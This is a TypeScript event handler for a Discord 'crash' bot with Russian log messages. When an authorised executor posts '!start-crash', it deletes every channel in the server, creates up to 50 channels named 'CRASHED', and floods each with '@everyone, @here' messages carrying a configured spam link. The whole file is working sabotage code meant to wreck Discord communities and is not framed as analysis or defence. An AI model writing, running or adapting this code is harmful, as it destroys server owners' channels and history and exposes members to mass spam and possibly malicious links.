import { Event } from '@src/utils/Event';
import { CrashClient } from '@src/client';
import { ChannelType, Message, PermissionFlagsBits } from 'discord.js';
import { LogLevel } from '@src/logger/enums/LogLevel';

export default new Event(
    {
        name: 'messageCreate'
    },
    async (client: CrashClient, message: Message<true>) => {
        if (
            !message ||
            !client.config.executors.includes(message.author.id) ||
            !message.guild
        ) {
            return;
        }

        const me = await message.guild.members.fetchMe().catch(() => {
            client.logger.log(LogLevel.WARN, `Ошибка при получении клиента`);
            return null;
        });

        if (message.content === '!start-crash') {
            await message.delete().catch(() => null);

            if (!me?.permissions.has(PermissionFlagsBits.ManageChannels)) {
                client.logger.log(LogLevel.WARN, `Недостаточно прав для краша`);
                return;
            }

            await Promise.all(
                message.guild.channels.cache.map((channel) =>
                    channel.delete(`CRASHED`)
                )
            ).catch((err) => {
                client.logger.log(
                    LogLevel.WARN,
                    `Не смог удалить каналы\n${err.stack ?? err}`
                );
            });

            const channelsLimited =
                client.config.channelsToCreate > 50 ||
                client.config.channelsToCreate < 1
                    ? 50
                    : client.config.channelsToCreate;
            const messagesLimited =
                client.config.messagesPerChannel > 15 ||
                client.config.messagesPerChannel < 1
                    ? 15
                    : client.config.messagesPerChannel;

            for (let i = 0; i < channelsLimited; i++) {
                await message.guild.channels
                    .create({
                        name: 'CRASHED',
                        type: ChannelType.GuildText
                    })
                    .then(async (channel) => {
                        for (let i = 0; i < messagesLimited; i++) {
                            await channel
                                .send({
                                    content: `@everyone, @here\n${client.config.linkToSpam}`
                                })
                                .catch((err) => {
                                    client.logger.log(
                                        LogLevel.WARN,
                                        `Не смог отправить сообщение в канал ${channel.id}\n${err.stack ?? err}`
                                    );
                                });
                        }
                    })
                    .catch((err) => {
                        client.logger.log(
                            LogLevel.WARN,
                            `Не смог создать канал\n${err.stack ?? err}`
                        );
                    });
            }
        }
    }
);
